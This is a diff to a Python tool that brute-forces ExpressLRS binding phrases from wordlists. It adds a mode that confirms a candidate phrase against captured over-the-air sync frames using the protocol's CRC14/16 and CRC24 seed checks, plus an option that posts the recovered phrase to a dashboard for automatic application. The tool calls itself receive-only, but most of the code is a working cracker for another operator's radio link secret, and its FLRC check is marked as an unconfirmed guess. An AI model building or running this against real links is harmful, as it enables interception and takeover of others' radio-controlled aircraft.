@@ -30,6 +30,9 @@ labeling only (receive, never control). See README "OSINT" section.
 """
 import argparse
 import hashlib
+import json
+import sys
+import urllib.request
 import itertools
 import multiprocessing
 import os
@@ -48,6 +51,94 @@ def uid_for_phrase(phrase):
 
 
 # ---------------------------------------------------------------------------
+# --- round 6: sync_frame checking (find mode) ------------------------------
+CRC14_POLY = 0x2E57
+CRC16_POLY = 0x3D65
+OTA_VERSION_ID = 3
+
+def crc_elrs(data, init, poly, bits):
+    crc = init & ((1 << bits) - 1)
+    for b in data:
+        crc ^= b << (bits - 8)
+        for _ in range(8):
+            crc = ((crc << 1) ^ poly) & ((1 << bits) - 1) if (crc >> (bits - 1)) & 1 else (crc << 1) & ((1 << bits) - 1)
+    return crc
+
+def lora_sync_ok(frame, uid):
+    """self-seeded CRC14/16 sync check for a candidate UID (modelId swept)."""
+    b = frame
+    if len(b) not in (8, 13) or (b[0] & 3) != 2:
+        return False
+    # tail gate FIRST: uid3/uid4 appear verbatim; only uid5's low 6 bits are
+    # modelId-XORed (mask 0x3f). Without it the 64-way sweep weakens the CRC
+    # to ~64/2^14 and candidates false-hit (field-found bug).
+    if uid[3] != b[4] or uid[4] != b[5] or (uid[5] & 0xC0) != (b[6] & 0xC0):
+        return False
+    bits = 14 if len(b) == 8 else 16
+    poly = CRC14_POLY if bits == 14 else CRC16_POLY
+    mask = (1 << bits) - 1
+    incrc = ((b[0] >> 2) << 8) | b[-1] if bits == 14 else (b[-2] | (b[-1] << 8))
+    cov = b[:-1] if bits == 14 else b[:-2]
+    for m in range(64):  # modelId sweep on UID5
+        u5 = uid[5] ^ (~m & 0x3F)
+        init = (((uid[4] << 8) | u5) ^ OTA_VERSION_ID) & 0xFFFF
+        tmp = bytearray(cov)
+        tmp[0] &= 0x03
+        if crc_elrs(bytes(tmp), init, poly, bits) == incrc:
+            return True
+    return False
+
+def crc24flrc(seed, data, variant):
+    if variant == 1:
+        st, poly = 0xFF0000 | seed, 0xFFFF00
+    elif variant == 3:
+        st, poly = (seed << 8) & 0xFFFFFF, 0x00FFFF
+    else:
+        st, poly = (seed << 8) & 0xFFFFFF, 0xFFFF00
+    for b in data:
+        st ^= b << 16
+        for _ in range(8):
+            st = ((st << 1) ^ poly) & 0xFFFFFF if (st >> 23) & 1 else (st << 1) & 0xFFFFFF
+    return st
+
+def flrc_frame_ok(frame, uid):
+    """HW-CRC seed (UID[4..5]) check across the explicit CRC24 variants."""
+    if len(frame) < 4:
+        return False
+    seed = (((uid[4] << 8) | uid[5]) ^ OTA_VERSION_ID) & 0xFFFF
+    calc = crc24flrc(seed, frame[:-3], 0)
+    got_be = (frame[-3] << 16) | (frame[-2] << 8) | frame[-1]
+    got_le = (frame[-1] << 16) | (frame[-2] << 8) | frame[-3]
+    for v in range(4):
+        c = crc24flrc(seed, frame[:-3], v)
+        if c in (got_be, got_le):
+            return True
+    return False
+
+def frames_match(uid, frames):
+    for f in frames:
+        if f["band"] == "lora" and lora_sync_ok(f["hex"], uid):
+            return f
+        if f["band"] == "flrc" and flrc_frame_ok(f["hex"], uid):
+            return f
+    return None
+
+def load_frames(path):
+    frames = []
+    fh = open(path) if path != "-" else sys.stdin
+    for line in fh:
+        line = line.strip()
+        if not line.startswith("{"):
+            continue
+        try:
+            d = json.loads(line)
+        except ValueError:
+            continue
+        if d.get("t") == "sync_frame":
+            frames.append({"band": d.get("band", "lora"),
+                           "hex": bytes.fromhex(d.get("hex", ""))})
+    return frames
+
 DEFAULT_PHRASES = ["ExpressLRS", "expresslrs", "default", "elrs", "bind", "password"]
 
 FPV_WORDS = [
@@ -139,7 +230,8 @@ def load_factory_uids():
     if os.path.exists(path):
         try:
             with open(path) as f:
-                table.update({k.lower(): v for k, v in json.load(f).items()})
+                table.update({k.lower(): v for k, v in json.load(f).items()
+                              if len(k) == 12 and all(c in "0123456789abcdef" for c in k)})
         except Exception as e:
             print("warning: factory_uids.json unreadable (%s); using built-in table" % e)
     return table
@@ -280,12 +372,19 @@ def parse_uid(text):
     return raw
 
 
+_FRAME_HOOK = None
+_FRAME_DONE = None
+
 def run_stage(name, gen, targets, matches):
     t0 = time.time()
     tried = 0
     last = t0
     for p in gen:
         u = uid_for_phrase(p)
+        if _FRAME_HOOK:
+            _FRAME_HOOK(p)
+            if _FRAME_DONE and _FRAME_DONE[0]:
+                return tried, time.time() - t0
         tried += 1
         for t, full in targets:
             if (u == t) if full else u.endswith(t):
@@ -313,9 +412,29 @@ def main():
                     help="word+d, d+word, word_d for d in 0..9999")
     ap.add_argument("--alnum", type=int, metavar="N",
                     help="brute force [a-z0-9]^N across all cores (1..6)")
+    ap.add_argument("--frames", metavar="FILE", help="captured sync_frame JSONs (file or - for stdin); per candidate UID check LoRa CRC14 + FLRC CRC24-seed against them")
+    ap.add_argument("--apply-url", help="POST the found phrase to this URL (dashboard auto-apply)")
+    ap.add_argument("--selftest", action="store_true", help="build golden sync_frames and verify the checkers")
     args = ap.parse_args()
 
     assert uid_for_phrase("ExpressLRS") == bytes.fromhex("437f2fb1d339"), "self-check failed"
+
+    if args.selftest:
+        uid = uid_for_phrase("ExpressLRS")
+        # LoRa golden: OTA4 sync, modelId=0
+        pkt = bytearray([0x02, 41, 7, (6 << 4), uid[3], uid[4], uid[5], 0])
+        init = (((uid[4] << 8) | uid[5]) ^ 3) & 0xFFFF
+        crc = crc_elrs(bytes([pkt[0] & 3]) + bytes(pkt[1:7]), init, CRC14_POLY, 14)
+        pkt[0] |= (crc >> 8) << 2
+        pkt[7] = crc & 0xFF
+        assert lora_sync_ok(bytes(pkt), uid), "selftest: lora"
+        # FLRC golden (best-guess variant 0 — pending silicon confirmation)
+        payload = bytes([0x2A, 41, 7, 0x64, uid[3]])
+        c = crc24flrc(init, payload, 0)
+        frame = payload + bytes([(c >> 16) & 0xFF, (c >> 8) & 0xFF, c & 0xFF])
+        assert flrc_frame_ok(frame, uid), "selftest: flrc"
+        print("SELFTEST OK (flrc variant = best-guess pending silicon probe)")
+        return 0
     assert uid_for_phrase("iloveiflight") == bytes.fromhex("12ce9b6e75c4"), "brand vector failed"
 
     targets = []
@@ -365,9 +484,41 @@ def main():
         print("rockyou loaded: %d words total" % len(words))
     print("dictionary: %d words (brand defaults first)" % len(words))
 
+    frames = load_frames(args.frames) if args.frames else []
+    if frames:
+        print("find mode: %d captured sync_frame(s) (%d lora / %d flrc)"
+              % (len(frames), sum(1 for f in frames if f["band"] == "lora"),
+                 sum(1 for f in frames if f["band"] == "flrc")))
+    frame_hits = []
+    applied = [False]
+
+    def check_frames(phrase):
+        if not frames or applied[0]:
+            return
+        uid = uid_for_phrase(phrase)
+        hit = frames_match(uid, frames)
+        if hit:
+            frame_hits.append((uid.hex(), phrase, hit["band"]))
+            print("\nFRAME MATCH: uid %s <- phrase %r (%s frame)"
+                  % (uid.hex(), phrase, hit["band"]))
+            if args.apply_url:
+                try:
+                    req = urllib.request.Request(
+                        args.apply_url,
+                        data=json.dumps({"phrase": phrase}).encode(),
+                        headers={"Content-Type": "application/json"})
+                    urllib.request.urlopen(req, timeout=5)
+                    print("applied phrase to dashboard: %s" % args.apply_url)
+                except Exception as e:
+                    print("apply failed: %s" % e)
+            applied[0] = True
+
     matches = []
     total = 0
     t_start = time.time()
+    global _FRAME_HOOK, _FRAME_DONE
+    _FRAME_HOOK = check_frames
+    _FRAME_DONE = applied
     # ordering: dict -> leet -> case -> wordnums -> alnum
     total += run_stage("dict", dict_candidates(words, False, False), remaining, matches)[0]
     if args.leet:
@@ -386,6 +537,8 @@ def main():
         total += len(ALNUM) ** args.alnum
 
     print("\n%d hashes total in %.1fs" % (total, time.time() - t_start))
+    if frame_hits:
+        return 0
     if matches or factory_hits:
         if matches:
             print("\nMATCHES:")
